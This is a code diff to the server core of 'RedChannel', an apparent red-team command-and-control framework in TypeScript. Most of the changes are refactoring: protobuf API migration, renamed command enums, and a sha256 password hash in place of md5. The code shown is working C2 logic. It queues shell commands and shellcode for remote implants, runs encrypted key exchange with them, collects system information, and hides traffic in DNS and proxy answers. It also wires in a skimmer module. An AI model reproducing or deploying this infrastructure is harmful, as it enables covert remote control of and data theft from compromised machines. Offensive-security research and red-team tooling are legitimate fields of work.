@@ -12,7 +12,8 @@ import StaticDnsModule from "../modules/static_dns";
 import ImplantModule from "../modules/implant";
 import ProxyModule from "../modules/proxy";
 
-import { implant } from "../pb/protos";
+import * as implant from "../pb/implant";
+import * as c2 from "../pb/c2";
 import { DefaultConfig, RedChannelConfig } from "./config";
 
 /*
@@ -81,18 +82,12 @@ export type AgentModel = {
     keyx?: ECKey;
     lastseen?: number;
     ip?: string;
-    channel?: AgentChannel;
+    channel?: c2.AgentChannel;
     allowKeyx?: boolean;
     sendq: SendQEntry[];
     // each agent has a map of dataId => chunks[]
     recvq: RecvQMap;
 };
-
-export enum AgentChannel {
-    UNKNOWN = "unknown",
-    DNS = "dns",
-    PROXY = "proxy",
-}
 
 export type RedChannelModules = {
     proxy: ProxyModule;
@@ -131,8 +126,12 @@ export default class RedChannel {
 
         this.config = this.resetConfig(initialConfig ?? DefaultConfig);
 
+        if (!this.config.c2.domain) {
+            throw new Error("Please specify the c2 domain via cli or config file");
+        }
+
         this.plaintextPassword = c2Password;
-        this.hashedPassword = crypto.createHash("md5").update(c2Password).digest("hex");
+        this.hashedPassword = crypto.createHash("sha256").update(c2Password).digest("hex");
 
         this.modules = {
             proxy: new ProxyModule(this.config, this.c2MessageHandler.bind(this), this.log),
@@ -141,15 +140,13 @@ export default class RedChannel {
             skimmer: new SkimmerModule(this.config, this.log),
         };
 
-        if (!this.config.c2.domain) {
-            throw new Error("Please specify the c2 domain via cli or config file, see '--help'");
-        }
-
         this.appRoot = __dirname;
 
         this.crypto = new Crypto();
 
         this.flood = new Map<AgentId, NodeJS.Timeout>();
+
+        this.modules.proxy.proxyInit();
     }
 
     resetConfig(initialConfig: RedChannelConfig) {
@@ -168,7 +165,7 @@ export default class RedChannel {
         return config;
     }
 
-    initAgent(agentId: string, channel: AgentChannel, ip?: string) {
+    initAgent(agentId: string, channel: c2.AgentChannel, ip?: string) {
         if (!this.agents.has(agentId)) {
             this.agents.set(agentId, {
                 id: agentId,
@@ -210,7 +207,7 @@ export default class RedChannel {
         if (!agentId) {
             // broadcast keyx if no agent is specified
             for (const id of this.agents.keys()) {
-                this.queueData(id, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey).catch((ex) => {
+                this.queueData(id, implant.AgentCommand.KEYX, uncompressedPublicKey).catch((ex) => {
                     this.log.error(`error queueing data for agent ${id}: ${emsg(ex)}`);
                 });
             }
@@ -218,7 +215,7 @@ export default class RedChannel {
             return;
         }
 
-        this.queueData(agentId, implant.AgentCommand.AGENT_KEYX, uncompressedPublicKey)
+        this.queueData(agentId, implant.AgentCommand.KEYX, uncompressedPublicKey)
             .then(() => {
                 this.log.warn(`keyx started with agent ${agentId}`);
             })
@@ -232,19 +229,19 @@ export default class RedChannel {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(agentId, implant.AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
+        this.queueData(agentId, implant.AgentCommand.SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
 
     sendCommandShell(agentId: string, shellCommand: string) {
-        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
+        this.queueData(agentId, implant.AgentCommand.EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
 
     sendCommandExecShellcode(agentId: string, shellcode: Buffer) {
-        this.queueData(agentId, implant.AgentCommand.AGENT_EXECUTE_SHELLCODE, shellcode).catch((ex) => {
+        this.queueData(agentId, implant.AgentCommand.EXECUTE_SHELLCODE, shellcode).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
@@ -257,9 +254,9 @@ export default class RedChannel {
         if (this.config.implant.proxy_key !== undefined) configProto.webKey = { value: this.config.implant.proxy_key };
         if (this.config.implant.proxy_url !== undefined) configProto.webUrl = { value: this.config.implant.proxy_url };
 
-        const configProtoBuffer = Buffer.from(implant.AgentConfig.encode(configProto).finish());
+        const configProtoBuffer = Buffer.from(implant.AgentConfig.toBinary(configProto));
         // no need to send data, just the config proto
-        this.queueData(agentId, implant.AgentCommand.AGENT_SET_CONFIG, configProtoBuffer).catch((ex) => {
+        this.queueData(agentId, implant.AgentCommand.SET_CONFIG, configProtoBuffer).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
@@ -269,7 +266,7 @@ export default class RedChannel {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(agentId, implant.AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
+        this.queueData(agentId, implant.AgentCommand.SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
             this.log.error(`error queueing data: ${emsg(ex)}`);
         });
     }
@@ -286,20 +283,20 @@ export default class RedChannel {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
 
-        const commandProto = implant.Command.Request.create({
+        const commandProto = implant.Command_Request.create({
             command: command,
             data: data,
         });
 
-        let commandProtoBuffer = Buffer.from(implant.Command.Request.encode(commandProto).finish());
+        let commandProtoBuffer = Buffer.from(implant.Command_Request.toBinary(commandProto));
 
         // keyx commands are not encrypted
-        if (command !== implant.AgentCommand.AGENT_KEYX) {
+        if (command !== implant.AgentCommand.KEYX) {
             commandProtoBuffer = this.encryptPayload(commandProtoBuffer, agent.secret);
         }
 
         // this will be set to false after keyx is received and there are no more keyx in sendq
-        if (command === implant.AgentCommand.AGENT_KEYX) agent.allowKeyx = true;
+        if (command === implant.AgentCommand.KEYX) agent.allowKeyx = true;
 
         const dataString = commandProtoBuffer.toString("hex");
         const dataBlocks = chunkString(dataString, Config.DATA_BLOCK_STRING_LENGTH);
@@ -354,7 +351,7 @@ export default class RedChannel {
                 );
             }
 
-            if (this.config.proxy.enabled && agent.channel === AgentChannel.PROXY) {
+            if (this.config.proxy.enabled && agent.channel === c2.AgentChannel.PROXY) {
                 await this.modules.proxy.sendToProxy(agent.id, ips);
             } else {
                 agent.sendq.push(ips);
@@ -387,7 +384,7 @@ export default class RedChannel {
 
     makeIpString(status: implant.C2ResponseStatus) {
         const lastByte = padZero(status.toString(16), 2);
-        return `${Config.IP_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.AGENT_IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${lastByte}`;
+        return `${Config.IP_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${lastByte}`;
     }
 
     /**
@@ -403,8 +400,8 @@ export default class RedChannel {
         return chunks_array.filter((a) => a !== undefined).length;
     }
 
-    getAllAgents() {
-        return this.agents.keys();
+    getAgents() {
+        return this.agents;
     }
 
     getAgent(agentId: string): AgentModel | null {
@@ -420,7 +417,7 @@ export default class RedChannel {
             antiCacheValue: "",
             agentId: "",
             dataId: "",
-            command: implant.AgentCommand.AGENT_UNSPECIFIED,
+            command: implant.AgentCommand.UNSPECIFIED,
             chunkNumber: 0,
             totalChunks: 0,
             chunk: "",
@@ -471,7 +468,7 @@ export default class RedChannel {
     c2MessageHandler(req: C2MessageRequest, res: C2MessageResponse) {
         const question = res.question[0];
         const hostname = question.name;
-        const channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
+        const channel = question.type === "PROXY" ? c2.AgentChannel.PROXY : c2.AgentChannel.DNS;
 
         const staticDnsHostnameIp = this.config.static_dns.get(hostname);
         if (staticDnsHostnameIp) {
@@ -685,7 +682,7 @@ export default class RedChannel {
 
         switch (command) {
             // checkin should be authenticated (decrypt dummy data) or rogue agents can drain the queue for legitimate ones
-            case implant.AgentCommand.AGENT_CHECKIN: {
+            case implant.AgentCommand.CHECKIN: {
                 let checkInAnswers: C2Answer[] | void = [];
                 try {
                     checkInAnswers = this.checkInAgent(agent, hostname, data);
@@ -711,7 +708,7 @@ export default class RedChannel {
                 ];
                 break;
             }
-            case implant.AgentCommand.AGENT_KEYX: {
+            case implant.AgentCommand.KEYX: {
                 if (!agent.allowKeyx) {
                     this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                     return [
@@ -772,10 +769,10 @@ export default class RedChannel {
                 this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);
 
                 // if there are no more queued up keyx's, ignore further keyxs from agent
-                if (!this.isCommandInSendQ(agentId, implant.AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
+                if (!this.isCommandInSendQ(agentId, implant.AgentCommand.KEYX)) agent.allowKeyx = false;
                 break;
             }
-            case implant.AgentCommand.AGENT_MESSAGE: {
+            case implant.AgentCommand.MESSAGE: {
                 let agentMessage = "";
                 try {
                     const agentCommandResponseProto = this.decryptAgentData(agentId, data);
@@ -794,12 +791,12 @@ export default class RedChannel {
                 this.log.success(`agent(${agentId}) output>\n ${agentMessage}`);
                 break;
             }
-            case implant.AgentCommand.AGENT_SYSINFO: {
+            case implant.AgentCommand.SYSINFO: {
                 let sysInfo: implant.SysInfoData = implant.SysInfoData.create({});
                 try {
                     const agentCommandResponseProto = this.decryptAgentData(agentId, data);
-                    if (agentCommandResponseProto && agentCommandResponseProto.data) {
-                        sysInfo = implant.SysInfoData.decode(agentCommandResponseProto.data);
+                    if (agentCommandResponseProto?.data) {
+                        sysInfo = implant.SysInfoData.fromBinary(agentCommandResponseProto.data);
                     }
                 } catch (ex) {
                     this.log.error(`cannot decrypt sysinfo from ${agentId}: ${emsg(ex)}`);
@@ -853,7 +850,7 @@ export default class RedChannel {
         return Buffer.concat([cipher.iv, cipher.data]);
     }
 
-    decryptAgentData(agentId: string, data: string): implant.Command.Response | void {
+    decryptAgentData(agentId: string, data: string): implant.Command_Response | void {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!data) throw new Error("invalid data");
@@ -868,7 +865,7 @@ export default class RedChannel {
         const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
 
         try {
-            const commandProto = implant.Command.Response.decode(plaintext);
+            const commandProto = implant.Command_Response.fromBinary(plaintext);
             return commandProto;
         } catch (ex) {
             throw new Error(`failed to decode proto: ${emsg(ex)}`);
